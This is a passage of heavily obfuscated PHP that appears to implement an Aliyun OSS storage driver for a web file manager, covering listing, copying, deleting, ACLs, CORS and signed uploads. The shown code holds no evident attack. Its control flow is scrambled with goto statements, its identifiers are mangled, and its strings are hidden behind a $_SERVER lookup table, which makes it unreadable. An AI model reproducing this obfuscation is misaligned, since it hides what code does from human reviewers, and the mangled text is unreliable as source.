isset($dÈĞİ‚‰[$a¸ÂƒÍ½Ç[221]])) { $dÈĞİ‚‰[$a¸ÂƒÍ½Ç[203]] = $dÈĞİ‚‰[$a¸ÂƒÍ½Ç[221]]; } } catch (OSS\Core\OssException $a’¯ÜÇÎÌ) { $dÈĞİ‚‰ = !1; } if (!$dÈĞİ‚‰) { } return $dÈĞİ‚‰; } protected function _isFolder($d„§»ø¨Á) { goto b¾‰³¤Ô©Ë; b¾‰³¤Ô©Ë: $A›Ç„½’ã =& $_SERVER[õëù©û]; $d„§»ø¨Á = rtrim($d„§»ø¨Á, $A›Ç„½’ã[8]); if ($d„§»ø¨Á == $A›Ç„½’ã[33] || $d„§»ø¨Á == $A›Ç„½’ã[8]) { return !0; } goto A›Ë‡Çó¤; A›Ë‡Çó¤: $A‚—ÔÒÂ = $this->client->getBucket($this->bucket, $d„§»ø¨Á, null, 1); if (empty($A‚—ÔÒÂ)) { return !1; } $A‚—ÔÒÂ = array_values($A‚—ÔÒÂ); goto Då«ãùÏ„ò; Då«ãùÏ„ò: if (substr($A‚—ÔÒÂ[0][$A›Ç„½’ã[28]], -1) == $A›Ç„½’ã[8]) { return !0; } if (get_path_this($A‚—ÔÒÂ[0][$A›Ç„½’ã[28]]) == get_path_this($d„§»ø¨Á)) { return !1; } return !0; goto BåˆÛøË ; BåˆÛøË : } } define($_SERVER[õëù©û][222], 1); goto bò¥ã¨õ; eî‰¸‘ˆÈ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($cÒ–‚ÏÜÆÃ) { parent::__construct($cÒ–‚ÏÜÆÃ); $this->signatureVersion($_SERVER[õëù©û][196]); } public function fileOutLink($eôÒ­’³) { $D®…ÓŸ¶„È =& $_SERVER[õëù©û]; if (substr($eôÒ­’³, 0, 7) == $D®…ÓŸ¶„È[1099]) { $eôÒ­’³ = $D®…ÓŸ¶„È[1100] . substr($eôÒ­’³, 7); } header($D®…ÓŸ¶„È[152] . $eôÒ­’³); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($Dø¬ÉÀŸœÔ) { parent::__construct(); include_once SDK_DIR . $_SERVER[õëù©û][1154]; $this->_init($Dø¬ÉÀŸœÔ); } public function _init($a·Åò–è) { foreach ($a·Åò–è as $bç°´Úº¾í => $C˜££Æ“…­) { if (isset($this->{$bç°´Úº¾í})) { $this->{$bç°´Úº¾í} = $C˜££Æ“…­; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[õëù©û][1155], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto eğŠ²³Èâç; eğŠ²³Èâç: $FÆ“ˆÛóöƒ =& $_SERVER[õëù©û]; $cÖòæÉ¤„’ = new OSS\Model\CorsConfig(); $B¯ÉÂ´’…› = new OSS\Model\CorsRule(); goto DÂêğØ×Ä; DÂêğØ×Ä: $B¯ÉÂ´’…›->addAllowedOrigin($FÆ“ˆÛóöƒ[1156]); $B¯ÉÂ´’…›->addAllowedMethod($FÆ“ˆÛóöƒ[1157]); $B¯ÉÂ´’…›->addAllowedMethod($FÆ“ˆÛóöƒ[1158]); goto böñ®Ñ¢Ñ; b³±Á’•¯½: $B¯ÉÂ´’…›->setMaxAgeSeconds(600); $B¯ÉÂ´’…›->addExposeHeader($FÆ“ˆÛóöƒ[1161]); $B¯ÉÂ´’…›->addAllowedHeader($FÆ“ˆÛóöƒ[1156]); goto CËÊÏ·ö‹µ; CËÊÏ·ö‹µ: $cÖòæÉ¤„’->addRule($B¯ÉÂ´’…›); try { $this->client->putBucketCors($this->bucket, $cÖòæÉ¤„’); } catch (OSS\Core\OssException $c¬‹Ä‘³Ë) { return !1; } return !0; goto AÔàóÓ´¡; böñ®Ñ¢Ñ: $B¯ÉÂ´’…›->addAllowedMethod($FÆ“ˆÛóöƒ[1159]); $B¯ÉÂ´’…›->addAllowedMethod($FÆ“ˆÛóöƒ[1160]); $B¯ÉÂ´’…›->addAllowedMethod($FÆ“ˆÛóöƒ[151]); goto b³±Á’•¯½; AÔàóÓ´¡: } public function getBucketCors() { goto E¸´±¦±š†; E¸´±¦±š†: $Eä•¬£Û²Ê =& $_SERVER[õëù©û]; $FÈåï°Œ’¿ = null; try { $FÈåï°Œ’¿ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $f‰…¤¿±£Ş) { return null; } goto Cœ‹Ÿ­£Ãô; DŒ‹‚²Ù„¦: $DïÜŠ‚×Ö = $fèÂ“ŒÍï‹[0]->getMaxAgeSeconds(); $cÌ³¾•† = $fèÂ“ŒÍï‹[0]->getExposeHeaders(); $DÕëÁ¯ù• = $fèÂ“ŒÍï‹[0]->getAllowedHeaders(); goto cÅ¹’«„; Cœ‹Ÿ­£Ãô: if (!$FÈåï°Œ’¿ || !($fèÂ“ŒÍï‹ = $FÈåï°Œ’¿->getRules())) { return null; } $e…õ½ò†ÆÓ = $fèÂ“ŒÍï‹[0]->getAllowedOrigins(); $e†ÍæÈ°ø¨ = $fèÂ“ŒÍï‹[0]->getAllowedMethods(); goto DŒ‹‚²Ù„¦; cÅ¹’«„: return array($Eä•¬£Û²Ê[171] => isset($e…õ½ò†ÆÓ[0]) ? $e…õ½ò†ÆÓ[0] : $Eä•¬£Û²Ê[33], $Eä•¬£Û²Ê[175] => $e†ÍæÈ°ø¨, $Eä•¬£Û²Ê[1162] => $DïÜŠ‚×Ö, $Eä•¬£Û²Ê[1163] => isset($cÌ³¾•†[0]) ? $cÌ³¾•†[0] : $Eä•¬£Û²Ê[33], $Eä•¬£Û²Ê[173] => isset($DÕëÁ¯ù•[0]) ? $DÕëÁ¯ù•[0] : $Eä•¬£Û²Ê[33]); goto b½µ‘¦–æ; b½µ‘¦–æ: } public function isBucketCors() { goto fÇì½ô©µ…; fŸ¼Èòˆ­: if ($dù¤öâ´©Ÿ[$eïë£ÉÖÓ™[171]] != $eïë£ÉÖÓ™[172] || $dù¤öâ´©Ÿ[$eïë£ÉÖÓ™[173]] != $eïë£ÉÖÓ™[172]) { return !1; } $cŒ•Î«ÁÏ = array_map($eïë£ÉÖÓ™[174], $dù¤öâ´©Ÿ[$eïë£ÉÖÓ™[175]]); if (!is_array($cŒ•Î«ÁÏ)) { $cŒ•Î«ÁÏ = array(); } goto a²‹“ÏÔÌ; a²‹“ÏÔÌ: $CÛÔñôâƒ = array($eïë£ÉÖÓ™[176], $eïë£ÉÖÓ™[177], $eïë£ÉÖÓ™[178], $eïë£ÉÖÓ™[179], $eïë£ÉÖÓ™[180]); $A‹äã‹†ùô = array_diff($CÛÔñôâƒ, $cŒ•Î«ÁÏ); return empty($A‹äã‹†ùô); goto FŒŠ“È¥É; fÇì½ô©µ…: $eïë£ÉÖÓ™ =& $_SERVER[õëù©û]; $dù¤öâ´©Ÿ = $this->getBucketCors(); if (!$dù¤öâ´©Ÿ || !is_array($dù¤öâ´©Ÿ)) { return !1; } goto fŸ¼Èòˆ­; FŒŠ“È¥É: } public function mkfile($eÌÓÎß©», $EÕ¾…¨Õ = '', $b¨‡ˆÀ²Š‡ = REPEAT_RENAME) { $A™Ğ˜È”ÆŠ = $this->setContent($eÌÓÎß©», $EÕ¾…¨Õ); if ($A™Ğ˜È”ÆŠ !== !1) { return $this->getPathOuter($eÌÓÎß©»); } return !1; } public function mkdir($cİ£­„‹Ñ•, $eÃ‘î½¼Ğë = REPEAT_SKIP) { if ($this->_isFolder($cİ£­„‹Ñ•)) { return $this->getPathOuter($cİ£­„‹Ñ•); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($cİ£­„‹Ñ•)); } catch (OSS\Core\OssException $fœâñä„ô•) { return !1; } return $this->getPathOuter($cİ£­„‹Ñ•); } private function fileList($d†Œ¯íñ­, $E´Å¢¸óëÒ = '', $B½Å‹ùì› = 0) { goto Bä¿æí¦‚‡; f©¿î‰·â¦: $Dîó‡—‹Š = $Fó»ÏÓÇ­›[33]; $f¢²ÁåÊË = 1000; $cµ‚–Ş§ = $F““¹Í‘î¶ = array(); goto F¹¦Ã‹«ÃÙ; F¹¦Ã‹«ÃÙ: while (!0) { $F’÷İà¹Ä¼ = array($Fó»ÏÓÇ­›[1164] => $E´Å¢¸óëÒ, $Fó»ÏÓÇ­›[182] => $c³á²³¬ÇÍ, $Fó»ÏÓÇ­›[1165] => $f¢²ÁåÊË, $Fó»ÏÓÇ­›[1166] => $Dîó‡—‹Š); try { $Fò¤ÛŠÁ³ƒ = $this->client->listObjects($this->bucket, $F’÷İà¹Ä¼); } catch (OSS\Core\OssException $bœ£­…ù´ä) { break; } $Dîó‡—‹Š = $Fò¤ÛŠÁ³ƒ->getNextMarker(); $bÖ°Ş§–Õ… = $Fò¤ÛŠÁ³ƒ->getObjectList(); $Eï”‡‘Œè = $Fò¤ÛŠÁ³ƒ->getPrefixList(); foreach ($bÖ°Ş§–Õ… as $B‰¢®ŞÔÄ) { if ($B‰¢®ŞÔÄ->getKey() == $c³á²³¬ÇÍ) { continue; } $dçÔå†ÛŞ¥ = $B‰¢®ŞÔÄ->getKey(); if ($B½Å‹ùì›) { $dçÔå†ÛŞ¥ = array($Fó»ÏÓÇ­›[28] => $dçÔå†ÛŞ¥, $Fó»ÏÓÇ­›[77] => $B‰¢®ŞÔÄ->getSize(), $Fó»ÏÓÇ­›[186] => strtotime($B‰¢®ŞÔÄ->getLastModified())); } $F““¹Í‘î¶[] = $dçÔå†ÛŞ¥; } foreach ($Eï”‡‘Œè as $FŒÇëÍÇ») { $cµ‚–Ş§[] = $FŒÇëÍÇ»->getPrefix(); } if ($Dîó‡—‹Š === $Fó»ÏÓÇ­›[33]) { break; } } return array($Fó»ÏÓÇ­›[74] => $cµ‚–Ş§, $Fó»ÏÓÇ­›[73] => $F““¹Í‘î¶); goto d°Å›·”®; Bä¿æí¦‚‡: $Fó»ÏÓÇ­› =& $_SERVER[õëù©û]; $d†Œ¯íñ­ = trim($d†Œ¯íñ­, $Fó»ÏÓÇ­›[8]); $c³á²³¬ÇÍ = empty($d†Œ¯íñ­) ? $Fó»ÏÓÇ­›[33] : $d†Œ¯íñ­ . $Fó»ÏÓÇ­›[8]; goto f©¿î‰·â¦; d°Å›·”®: } public function copyFile($AÃçŞÍ³ËÖ, $c™ÙÑ¢¥‰ó) { $CóÍƒß§ÀŠ = $this->size($AÃçŞÍ³ËÖ); if ($CóÍƒß§ÀŠ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $AÃçŞÍ³ËÖ, $this->bucket, $this->pathEncode($c™ÙÑ¢¥‰ó)); } catch (OSS\Core\OssException $aØĞß¡ñÜ›) { return !1; } return !0; } return $this->multiCopyObject($AÃçŞÍ³ËÖ, $c™ÙÑ¢¥‰ó, $CóÍƒß§ÀŠ); } private function multiCopyObject($f²Ó„ÑïµĞ, $A†Ë­¥š , $e°‡ê®”ñ) { $E™´ŠÄ´šœ =& $_SERVER[õëù©û]; try { goto AÄ¢«Úáã; fÕÑˆ††‹‰: $aóçõ‚Ñ³ë = 1; $AŞö—ëì = 0; $c¶àöì´Š† = array(); goto FóÖÏ¦•³ß; F‹÷é¹¢µ¼: $Dæù®×Ë‡’ = array(); foreach ($c¶àöì´Š† as $A±Ë½Õ±« => $a˜¸³ÏÑ ) { $Dæù®×Ë‡’[] = array($E™´ŠÄ´šœ[1171] => $A±Ë½Õ±« + 1, $E™´ŠÄ´šœ[1172] => $a˜¸³ÏÑ ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($A†Ë­¥š ), $f“öòÀØ, $Dæù®×Ë‡’); goto e¤ÚÍğ«; AÄ¢«Úáã: $DéîèéÎÙÕ = array(); if ($c²´¦’Û¦Ü = $this->hashMd5($f²Ó„ÑïµĞ)) { $DéîèéÎÙÕ = array(OSS\OssClient::OSS_HEADERS => array($E™´ŠÄ´šœ[1167] => $c²´¦’Û¦Ü)); } $f“öòÀØ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($A†Ë­¥š ), $DéîèéÎÙÕ); goto fÕÑˆ††‹‰; FóÖÏ¦•³ß: $bµ›©ÄÆƒì = 1024 * 1024 * 10; $EŞ–ŸÇéº¥ = $this->client->generateMultiuploadParts($e°‡ê®”ñ, $bµ›©ÄÆƒì); foreach ($EŞ–ŸÇéº¥ as $A±Ë½Õ±« => $D¢™‹¥ çÙ) { $Féà…Áå¨ = $AŞö—ëì + (int) $D¢™‹¥ çÙ[$E™´ŠÄ´šœ[1168]]; $cÀ—‘°İ = (int) $D¢™‹¥ çÙ[$E™´ŠÄ´šœ[321]] + $Féà…Áå¨ - 1; $dÍ‚ÖĞ˜¢” = array($E™´ŠÄ´šœ[1169] => $Féà…Áå¨, $E™´ŠÄ´šœ[1170] => $cÀ—‘°İ); $c¶àöì´Š†[] = $this->client->uploadPartCopy($this->bucket, $f²Ó„ÑïµĞ, $this->bucket, $this->pathEncode($A†Ë­¥š ), $aóçõ‚Ñ³ë, $f“öòÀØ, $dÍ‚ÖĞ˜¢”); $aóçõ‚Ñ³ë = $aóçõ‚Ñ³ë + 1; } goto F‹÷é¹¢µ¼; e¤ÚÍğ«: } catch (OSS\Core\OssException $cŠÕìÁ¾ï) { return !1; } return !0; } public function moveFile($b¥Ÿƒñ­, $aÜêêÕï•æ) { if ($this->copyFile($b¥Ÿƒñ­, $aÜêêÕï•æ)) { $this->remove($b¥Ÿƒñ­); return !0; } return !1; } public function delFile($c’§Ô¯À©) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($c’§Ô¯À©)); } catch (OSS\Core\OssException $Eæê˜ÍÎ¸ó) { return !1; } return !0; } public function delFolder($cé½¶ôªôÍ) { $DÍÏ³íÇŠ± =& $_SERVER[õëù©û]; $b¯àİ„Öª… = $this->fileList($cé½¶ôªôÍ); if (!empty($cé½¶ôªôÍ) && !in_array(trim($cé½¶ôªôÍ, $DÍÏ³íÇŠ±[8]) . $DÍÏ³íÇŠ±[8], $b¯àİ„Öª…[$DÍÏ³íÇŠ±[73]])) { $b¯àİ„Öª…[$DÍÏ³íÇŠ±[73]][] = trim($cé½¶ôªôÍ, $DÍÏ³íÇŠ±[8]) . $DÍÏ³íÇŠ±[8]; } foreach (array_chunk($b¯àİ„Öª…[$DÍÏ³íÇŠ±[73]], 1000) as $cã°İŒÓ‹Ô) { try { $this->client->deleteObjects($this->bucket, $cã°İŒÓ‹Ô); } catch (OSS\Core\OssException $c÷µ¥­¨¹è) { continue; } } return !0; } public function rename($A‰›Áç”Á, $EÉİÁóÒË) { return $this->renameObject($A‰›Áç”Á, $EÉİÁóÒË); } private function fileInfo($Eø³­ÀàÙ, $bªİ†‹á = array()) { goto a±ÕÚ²Ñ¢™; a±ÕÚ²Ñ¢™: $cİÃ†¾àé¹ =& $_SERVER[õëù©û]; $eßĞ¼’™ = array($cİÃ†¾àé¹[28] => $this->pathThis($Eø³­ÀàÙ), $cİÃ†¾àé¹[75] => $this->getPathOuter($Eø³­ÀàÙ), $cİÃ†¾àé¹[29] => $cİÃ†¾àé¹[163], $cİÃ†¾àé¹[183] => 0, $cİÃ†¾àé¹[106] => 0, $cİÃ†¾àé¹[77] => 0, $cİÃ†¾àé¹[156] => $this->ext($Eø³­ÀàÙ), $cİÃ†¾àé¹[184] => !0, $cİÃ†¾àé¹[185] => !0); if (empty($bªİ†‹á)) { $b­‚ƒ¼ôß• = $this->objectMeta($Eø³­ÀàÙ); if (!$b­‚ƒ¼ôß•) { return $eßĞ¼’™; } $bªİ†‹á = array($cİÃ†¾àé¹[106] => strtotime($b­‚ƒ¼ôß•[$cİÃ†¾àé¹[1173]]), $cİÃ†¾àé¹[77] => $b­‚ƒ¼ôß•[$cİÃ†¾àé¹[1174]] + 0); } goto EÕ¯—ëÊçï; cğÒîíˆï: return $eßĞ¼’™; goto B½ ÓÁğâ; EÕ¯—ëÊçï: if (isset($bªİ†‹á[$cİÃ†¾àé¹[77]])) { $eßĞ¼’™[$cİÃ†¾àé¹[77]] = $bªİ†‹á[$cİÃ†¾àé¹[77]]; } if (isset($bªİ†‹á[$cİÃ†¾àé¹[106]])) { $eßĞ¼’™[$cİÃ†¾àé¹[106]] = $bªİ†‹á[$cİÃ†¾àé¹[106]]; } if (isset($bªİ†‹á[$cİÃ†¾àé¹[186]]) && !trim($eßĞ¼’™[$cİÃ†¾àé¹[106]])) { $eßĞ¼’™[$cİÃ†¾àé¹[106]] = $bªİ†‹á[$cİÃ†¾àé¹[186]]; } goto cğÒîíˆï; B½ ÓÁğâ: } private function folderInfo($A†¯ÌÎ¿Ë, $b°®„êÉ = array()) { $d—¤¬á—Ü =& $_SERVER[õëù©û]; $A¼ßØŞ¸‘ç = array($d—¤¬á—Ü[28] => $this->pathThis($A†¯ÌÎ¿Ë), $d—¤¬á—Ü[75] => $this->getPathOuter($d—¤¬á—Ü[8] . $A†¯ÌÎ¿Ë), $d—¤¬á—Ü[29] => $d—¤¬á—Ü[76], $d—¤¬á—Ü[183] => 0, $d—¤¬á—Ü[106] => 0, $d—¤¬á—Ü[184] => !0, $d—¤¬á—Ü[185] => !0); if (empty($b°®„êÉ)) { $A†¯ÌÎ¿Ë = rtrim($A†¯ÌÎ¿Ë, $d—¤¬á—Ü[8]) . $d—¤¬á—Ü[8]; $a—©»Áê®“ = $this->objectMeta($A†¯ÌÎ¿Ë); if (!$a—©»Áê®“) { return $A¼ßØŞ¸‘ç; } $b°®„êÉ = array($d—¤¬á—Ü[183] => $a—©»Áê®“[$d—¤¬á—Ü[1175]][$d—¤¬á—Ü[1176]], $d—¤¬á—Ü[106] => strtotime($a—©»Áê®“[$d—¤¬á—Ü[1173]])); } if (isset($b°®„êÉ[$d—¤¬á—Ü[106]])) { $A¼ßØŞ¸‘ç[$d—¤¬á—Ü[106]] = $b°®„êÉ[$d—¤¬á—Ü[106]]; } if (isset($b°®„êÉ[$d—¤¬á—Ü[183]])) { $A¼ßØŞ¸‘ç[$d—¤¬á—Ü[183]] = $b°®„êÉ[$d—¤¬á—Ü[183]]; } return $A¼ßØŞ¸‘ç; } public function listPath($aÖàâ¥ï¬, $aîŒ¿Ùç†ª = false) { $FÉ™ƒ™¨¤ =& $_SERVER[õëù©û]; $DšÍÊÃÊâŠ = $this->fileList($aÖàâ¥ï¬, $FÉ™ƒ™¨¤[8], !0); foreach ($DšÍÊÃÊâŠ[$FÉ™ƒ™¨¤[74]] as $BĞÕÍ¹É => $càóÔ¸ª”À) { $DšÍÊÃÊâŠ[$FÉ™ƒ™¨¤[74]][$BĞÕÍ¹É] = $this->folderInfo($càóÔ¸ª”À, $càóÔ¸ª”À); } foreach ($DšÍÊÃÊâŠ[$FÉ™ƒ™¨¤[73]] as $BĞÕÍ¹É => $càóÔ¸ª”À) { $DšÍÊÃÊâŠ[$FÉ™ƒ™¨¤[73]][$BĞÕÍ¹É] = $this->fileInfo($càóÔ¸ª”À[$FÉ™ƒ™¨¤[28]], $càóÔ¸ª”À); } return $DšÍÊÃÊâŠ; } public function has($aİÎÑÀÙ«Š, $F­“ìÎ·‡É = false, $E‰Ÿ·“ğá  = true) { goto B˜Ş¿¥÷æ¯; B˜Ş¿¥÷æ¯: $f¨ÔøàÍ´á =& $_SERVER[õëù©û]; $aİÎÑÀÙ«Š = trim($aİÎÑÀÙ«Š, $f¨ÔøàÍ´á[8]); $dœö¸‰¼ö× = empty($aİÎÑÀÙ«Š) ? $f¨ÔøàÍ´á[33] : $aİÎÑÀÙ«Š . $f¨ÔøàÍ´á[8]; goto eáéô‘Ó¥Ç; eáéô‘Ó¥Ç: $Cõœ‰ùˆç = $f¨ÔøàÍ´á[33]; $EäùŞ°½ÄÍ = 500; $BîŞ —ÅÒÍ = 0; goto dÓŸŞ¤Œƒ; Eö¥Ï±í®»: return !1; goto E‚ø­šÔÌ‡; dÓŸŞ¤Œƒ: $C—ì‰é™¥â = 0; while (!0) { $Cîã‰¸óØĞ = array($f¨ÔøàÍ´á[1164] => $f¨ÔøàÍ´á[8], $f¨ÔøàÍ´á[182] => $dœö¸‰¼ö×, $f¨ÔøàÍ´á[1165] => $EäùŞ°½ÄÍ, $f¨ÔøàÍ´á[1166] => $Cõœ‰ùˆç); try { $Dà‰á¥‹á© = $this->client->listObjects($this->bucket, $Cîã‰¸óØĞ); } catch (OSS\Core\OssException $AÀ³œ¦’à«) { break; } $Cõœ‰ùˆç = $Dà‰á¥‹á©->getNextMarker(); $dœ§Ú©¼è› = $Dà‰á¥‹á©->getObjectList(); $eÊ»™ßÕÙ = $Dà‰á¥‹á©->getPrefixList(); if ($F­“ìÎ·‡É) { if (count($dœ§Ú©¼è›) > 1 || count($dœ§Ú©¼è›) == 1 && $dœ§Ú©¼è›[0]->getKey() != $dœö¸‰¼ö×) { $BîŞ —ÅÒÍ += count($dœ§Ú©¼è›) - 1; } if (!empty($eÊ»™ßÕÙ)) { $C—ì‰é™¥â += count($eÊ»™ßÕÙ); } if ($Cõœ‰ùˆç === $f¨ÔøàÍ´á[33]) { break; } continue; } if ($E‰Ÿ·“ğá ) { if (!empty($dœ§Ú©¼è›)) { if (count($dœ§Ú©¼è›) > 1 || $dœ§Ú©¼è›[0]->getKey() != $dœö¸‰¼ö×) { return !0; } } } else { if (!empty($eÊ»™ßÕÙ)) { return !0; } } if ($Cõœ‰ùˆç === $f¨ÔøàÍ´á[33]) { break; } } if ($F­“ìÎ·‡É) { return array($f¨ÔøàÍ´á[187] => $BîŞ —ÅÒÍ, $f¨ÔøàÍ´á[188] => $C—ì‰é™¥â); } goto Eö¥Ï±í®»; E‚ø­šÔÌ‡: } public function listAll($aÉÇ”£) { $fã ä°¸»‰ =& $_SERVER[õëù©û]; $dÜêÁ‡”±ò = $this->fileList($aÉÇ”£, $fã ä°¸»‰[33], !0); $E‹‹±ÁÚÁ£ = array(); foreach ($dÜêÁ‡”±ò[$fã ä°¸»‰[73]] as $Dì’ªÕ¤ç) { $E‹‹±ÁÚÁ£[$Dì’ªÕ¤ç[$fã ä°¸»‰[28]]] = $Dì’ªÕ¤ç[$fã ä°¸»‰[77]]; } return $this->listAllFiles($aÉÇ”£, array_keys($E‹‹±ÁÚÁ£), $E‹‹±ÁÚÁ£); } public function canRead($d«µåÎİš…) { $bÌÂŒÀ¿í¿ =& $_SERVER[õëù©û]; $D‹ÇÑö”™ï = $this->pathAcl($d«µåÎİš…); return $D‹ÇÑö”™ï == $bÌÂŒÀ¿í¿[1177] || $D‹ÇÑö”™ï == $bÌÂŒÀ¿í¿[486] ? !0 : !1; } public function canWrite($e´ĞõïÌªË) { $Fã¹©—·ø‡ = $this->pathAcl($e´ĞõïÌªË); return $Fã¹©—·ø‡ == $_SERVER[õëù©û][486] ? !0 : !1; } public function pathAcl($c—ô§ñİ‡¼) { goto CÚ…ë—ŒÉ±; FÛ³‚‹¾Î¦: $EÔ‚·÷©òâ = $c¸Ş‘¿Î¢ == $bó”¸İš¼®[34] ? $this->bucketAcl : $c¸Ş‘¿Î¢; if ($EÔ‚·÷©òâ == $bó”¸İš¼®[1178]) { return $bó”¸İš¼®[1177]; } if ($EÔ‚·÷©òâ == $bó”¸İš¼®[1179]) { return $bó”¸İš¼®[486]; } goto d„¡µåÍÊ‘; CÚ…ë—ŒÉ±: $bó”¸İš¼® =& $_SERVER[õëù©û]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $c¸Ş‘¿Î¢ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($c—ô§ñİ‡¼)); } catch (OSS\Core\OssException $cÌ¨¼¬ËŞ±) { return !1; } goto FÛ³‚‹¾Î¦; d„¡µåÍÊ‘: return $EÔ‚·÷©òâ; goto c©§ùŸ²±°; c©§ùŸ²±°: } private function chmodPath($A‚šŒôÕÙ, $e™À¤†ğÇ = '') { $Bˆ¿›†óçì =& $_SERVER[õëù©û]; $Cöï—ê² = empty($e™À¤†ğÇ) ? $Bˆ¿›†óçì[1179] : $e™À¤†ğÇ; $bùºÓÇäÔ‚ = array($Bˆ¿›†óçì[34], $Bˆ¿›†óçì[181], $Bˆ¿›†óçì[1178], $Bˆ¿›†óçì[1179]); if (!in_array($Cöï—ê², $bùºÓÇäÔ‚)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($A‚šŒôÕÙ), $Cöï—ê²); } catch (OSS\Core\OssException $DĞ·ìÙëÜº) { return !1; } return !0; } public function getContent($cè¦÷ÏĞô) { return $this->fileSubstr($cè¦÷ÏĞô, -1); } public function setContent($B»ßÚÔ»Ä¹, $bÉÓ–Çå÷‘ = '') { $F»ö˜êùî± =& $_SERVER[õëù©û]; try { $D¥îÊãÎˆÛ = $this->trafficLimit($F»ö˜êùî±[1180]); $A¤±£•†Éñ = $this->client->putObject($this->bucket, $this->pathEncode($B»ßÚÔ»Ä¹), $bÉÓ–Çå÷‘, $D¥îÊãÎˆÛ); } catch (OSS\Core\OssException $e‡„Œù¾‰ø) { return !1; } $BŒöÀõ‘‡ = array($F»ö˜êùî±[1167] => trim($A¤±£•†Éñ[$F»ö˜êùî±[1181]], $F»ö˜êùî±[112]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($B»ßÚÔ»Ä¹))); $this->updateObjMeta($B»ßÚÔ»Ä¹, $BŒöÀõ‘‡); return isset($A¤±£•†Éñ[$F»ö˜êùî±[1182]][$F»ö˜êùî±[1129]]) ? (int) $A¤±£•†Éñ[$F»ö˜êùî±[1182]][$F»ö˜êùî±[1129]] : strlen($A¤±£•†Éñ); } private function updateObjMeta($cÓÎÙğÂ§, $e› ‹†µ¢Ç) { $cÓÎÙğÂ§ = $this->pathEncode($cÓÎÙğÂ§); try { $a£…»œ÷ã° = array(OSS\OssClient::OSS_HEADERS => $e› ‹†µ¢Ç); $this->client->copyObject($this->bucket, $cÓÎÙğÂ§, $this->bucket, $cÓÎÙğÂ§, $a£…»œ÷ã°); } catch (OSS\Core\OssException $Aò–®‹¶»™) { return !1; } return !0; } public function upload($D”Í¯©²™ò, $e‚ÏÕÃ¾ïé, $bÃ¿Ä—¹› = false, $d¹¹°¡¸òˆ = REPEAT_REPLACE) { $CÀ Œ„Šö =& $_SERVER[õëù©û]; $d·‘¥®Äö· = trim($D”Í¯©²™ò, $CÀ Œ„Šö[8]); $AÏÙ†éá = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($CÀ Œ„Šö[1167] => @md5_file($e‚ÏÕÃ¾ïé)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($D”Í¯©²™ò))); $AÏÙ†éá = $this->trafficLimit($CÀ Œ„Šö[1180], $AÏÙ†éá); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($d·‘¥®Äö·), $e‚ÏÕÃ¾ïé, $AÏÙ†éá); } catch (OSS\Core\OssException $BÎ•´ó¢Øæ) { return !1; } return $this->getPathOuter($D”Í¯©²™ò); } public function getHost() { $FÆº›Ø·İ® =& $_SERVER[õëù©û]; $eå‡‡‚« = explode($FÆº›Ø·İ®[167], parent::getHost()); return $eå‡‡‚«[0] . $FÆº›Ø·İ®[167] . $this->bucket . $FÆº›Ø·İ®[91] . $eå‡‡‚«[1]; } public function uploadFormData($CÎàÂâ¨®‡, $D„µ§œÓÕ‹ = 3600) { goto EŒƒÅ‡§Š; EŒƒÅ‡§Š: $eÈâØÕèé½ =& $_SERVER[õëù©û]; if (!($c®ëìÕ‡© = $this->getHost())) { return !1; } $BÂøÔóÏä® = $D„µ§œÓÕ‹; goto A—‚Õ•…ÑÙ; E›‘ÕòªÅÑ: $dà´‹”Ù¸ = strpos($açŞÅğ§Ù, $eÈâØÕèé½[280]); $açŞÅğ§Ù = substr($açŞÅğ§Ù, 0, $dà´‹”Ù¸) . $eÈâØÕèé½[1184]; $CÜ¸º™›‡ = 1048576000 * 5; goto B ÎíÆ–¯©; A—‚Õ•…ÑÙ: $b“ƒ±½ê§‚ = date($eÈâØÕèé½[1183], time() + $BÂøÔóÏä®); $dÛã„Š½¦ˆ = new DateTime($b“ƒ±½ê§‚); $açŞÅğ§Ù = $dÛã„Š½¦ˆ->format(DateTime::ISO8601); goto E›‘ÕòªÅÑ; bÎÇÄ† Àá: return $D’ßÁÀº—×; goto d„ï˜Ş×ç; B ÎíÆ–¯©: $C—§„†ˆ²‰ = $this->pathFather($CÎàÂâ¨®‡); $eÂ¶”å·×¼ = array($eÈâØÕèé½[1086] => $açŞÅğ§Ù, $eÈâØÕèé½[1087] => array(array($eÈâØÕèé½[1185], 0, $CÜ¸º™›‡), array($eÈâØÕèé½[1090], $eÈâØÕèé½[1091], $C—§„†ˆ²‰))); $dä›«šŠí = base64_encode(json_encode($eÂ¶”å·×¼)); goto c…ôéÊ«‡¨; c…ôéÊ«‡¨: $b¤ªõÇºë¤ = base64_encode(hash_hmac($eÈâØÕèé½[214], $dä›«šŠí, $this->secret, !0)); $D’ßÁÀº—× = array($eÈâØÕèé½[1096] => $dä›«šŠí, $eÈâØÕèé½[1186] => $this->accessKey, $eÈâØÕèé½[1092] => $eÈâØÕèé½[1084], $eÈâØÕèé½[1187] => $b¤ªõÇºë¤, $eÈâØÕèé½[165] => $c®ëìÕ‡©); $D’ßÁÀº—× = $this->trafficLimit($eÈâØÕèé½[1180], $D’ßÁÀº—×); goto bÎÇÄ† Àá; d„ï˜Ş×ç: } public function multiUploadFormData($aŠÔÃ„ÑâŸ, $dÍÎ—¾ÈÜ· = 3600) { 